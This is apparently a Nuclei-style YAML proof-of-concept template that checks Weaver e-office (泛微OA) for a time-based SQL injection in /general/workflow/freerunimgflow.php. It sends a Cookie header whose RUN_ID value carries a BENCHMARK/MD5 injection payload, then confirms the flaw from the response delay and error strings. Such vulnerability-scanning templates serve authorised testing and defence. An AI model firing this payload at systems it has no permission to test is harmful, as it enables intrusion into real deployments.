id: poc-yaml-weaver-e-office-freerunimgflow-sqli

info:
  name: 泛微OA e-office freerunimgflow SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(3,7)}}"
  t2: "{{to_number(t1) + 3}}"

http:
  - method: GET
    path:
      - "/general/workflow/freerunimgflow.php"
    headers:
      Cookie: "RUN_ID=1 AND 9814=BENCHMARK({{t1}}000000,MD5(0x55615462))"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Warning"
          - "Variable passed to each()"
        part: body
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
